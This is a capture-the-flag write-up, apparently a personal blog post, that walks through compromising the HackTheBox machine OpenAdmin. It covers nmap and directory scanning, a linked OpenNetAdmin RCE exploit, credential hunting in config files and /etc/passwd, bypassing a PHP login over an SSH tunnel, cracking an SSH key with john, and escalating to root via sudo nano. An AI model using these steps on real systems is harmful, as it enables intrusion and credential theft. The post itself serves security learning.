---
title: "HTB - OpenAdmin"
date: 2021-02-08T12:42:29+01:00
categories: ["hacking","write-ups"]
tags: [HTB]
featuredImage: "/images/2021/02/OpenAdmin.png"
---
The importance to also patch your "applications", and not just your services.

## Recon

Again, this is an HTB box, so recon is mainly active, and I feel like activ recon == enum.

Still, we can check : 

* Name of the box : OpenAdmin ;
* OS "type", : Linux :
* Hints given on HTB website, information section :

![](/images/2021/02/2021-02-08_12-13.png)

## Enum

As always, we start with an nmap scan :

```text
sudo nmap -T4 -A -p- $target_ip
```

```text
# Nmap 7.91 scan initiated Thu Jan 28 15:27:52 2021 as: nmap -T4 -A -p- -oA HTB/OpenAdmin/nmap 10.129.88.186
Nmap scan report for 10.129.88.186
Host is up (0.023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/28%OT=22%CT=1%CU=33687%PV=Y%DS=2%DC=T%G=Y%TM=6012CA1
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%II=I%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=
OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T5(R=N)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   22.95 ms 10.10.14.1
2   24.65 ms 10.129.88.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 28 15:28:39 2021 -- 1 IP address (1 host up) scanned in 47.14 seconds

```

We find 2 services : ssh and Apache, both on standard ports. I like to check `searchsploit` for every service + version I find, in order to see if there any big vulnerability. In general, SSH isn't something that I"ll try to attack right away. It is more of a "last chance" path, with brute force.

In our case, we found a web server running Apache, but th version doesn't seem vulnerable. So, let's fire `nikto` and `dirbuster` :

```text
nikto -h http://$target_ip
```

And dirbuster like so :

![](/images/2021/02/2021-02-08_11-28.png)

Dirbuster, will find an interesting dir "ona", browsing to this ressource we discorverd it is running OpenNetAdmni version 18.1.1 which is outdated and probably vulnerable...

![](/ONA.png)

Indeed, after a quick search, we discover that it is vulnerable to Remote Code Execution (RCE), one of the most dangerous vuln we could find. Awesome!

## Exploitation

The vuln in question can be found here : [https://www.exploit-db.com/exploits/47691](https://www.exploit-db.com/exploits/47691) it is a simple Python script that will grant you a shell access on the remote machine.

Unfortunately, this shell only runs as `www-data`, the default `Apache` user and with `/sbin/nologin` shell. Still, we can still look around. I usually check what files I have access to :

```text
find / -xdev -type f -user $current_user
```

 Let's check who was access to sudo :

```text
ls -lhtrR /etc/sudo*
```

I also like to check what users are on the system and see if I can acces some files inside their home's folders :

```text
cat /etc/passwd && ls -lhtrR /home/
```

And of course in our case, explore the webroot folders.

Doing so, we discover two users : `joanna` and `jimmy` and an interesting set of credentials inside `/var/www/html/local/ona/config`.

It happens that the password from this file is actually jimmy's account SSH password. We now have a real bash shell, in a real terminal, with bash completion, hurray!

Once again, we check for common stuff, like what files do we own, and sudo rights :

```text
sudo -l
```

So, no sudo rights for us, however, we discover a new website that only runs on localhost. This website is very important, as we can see that, once logged as Jimmy, it will send us the SSH private key of Joanna.

I decided to create an SSH tunnel :

```text
ssh -L 52846:127.0.0.1:52846 -N -f jimmy@$target_ip
```

And to modify the login page in order to get rid of authentication :

```text
<?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
```

becomes :

```text
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && $_POST['password'] == 'plop') {
            //  if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
```

We can now browse to 127.0.0.1:52846 and log in with `jimmy` // `plop`.

And bingo! We got Joanna's key with an extra tip :

> Don't forget your "ninja" password

Of course, Joanna-s key is encrypted... We save it as id_joanna and hash it :

```text
python /usr/share/john/ssh2john.py id_joanna > joanna.hash
```

Now that we have the hashed version, time to crask it :

```text
john -wordlist=/usr/share/wordlists/rockyou.txt joanna.hash 
```

We finally, have joanna's ssh key password, we can now connect to the server as her!

As usual, we do all our basic checks. Doing so, we will notice :

* We have access to user.txt flag ;
* We have access to `sudo /bin/nano /opt/priv` without password.

Accessing root password which is always located in `/root/root.txt` is a simple matter of running `nano` as root (with `sudo`) and entering command mode with `^R` + `^X` to `cat` the flag file).

We now got `root.txt`!

## Conclusion

As we have just seen, one can obtain root access to a machine via "third party" application while the rest of the system is up to date. So, make sure to keep everything updated!
